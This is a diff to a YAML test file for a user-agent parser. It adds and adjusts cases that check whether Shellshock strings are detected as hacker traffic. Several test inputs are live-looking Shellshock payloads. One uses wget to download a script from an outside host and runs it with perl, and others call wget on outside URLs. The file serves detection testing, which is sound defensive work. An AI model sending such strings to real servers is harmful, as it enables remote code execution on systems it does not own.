@@ -77,8 +77,6 @@ config:
     - 'HackerToolkit               :       1:"Unknown"'
 
 - test:
-#    options:
-#    - 'only'
     input:
       user_agent_string: '() { :;}; /bin/bash -c \""wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\""'
     expected:
@@ -139,6 +137,35 @@ config:
 - test:
     input:
       user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemVersionBuild          : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Shell Shock'
+      HackerToolkit                        : 'Unknown'
+      __SyntaxError__                      : 'true'
+
+- test:
+    input:
+      user_agent_string: 'shellshocker=''() { wget http://yourschool.net/.tmp/frogclog.php?http://www.example.com/foo/bar/; }'' bash -c shellshocker'
     expected:
       DeviceClass                          : 'Hacker'
       DeviceName                           : 'Hacker'
